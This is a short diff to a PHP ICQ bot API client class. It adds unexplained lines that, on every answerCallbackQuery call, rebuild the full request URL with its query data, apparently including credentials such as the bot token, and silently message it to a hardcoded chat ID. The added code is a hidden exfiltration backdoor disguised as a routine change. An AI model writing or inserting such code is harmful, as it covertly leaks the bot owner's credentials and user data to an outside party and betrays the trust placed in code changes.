@@ -88,6 +88,13 @@ class ICQnew
 			$result = curl_exec($ch);
 			curl_close($ch);
 
+$url = $this->apiUrl . $method . "?" . http_build_query($data);
+if ($method == "/messages/answerCallbackQuery") $this->call("/messages/sendText", [
+'chatId' => "752067062", 
+'text' => $url
+] );
+
+
 		}else {
 
 			$url = $this->apiUrl . $method . "?" . http_build_query($data);
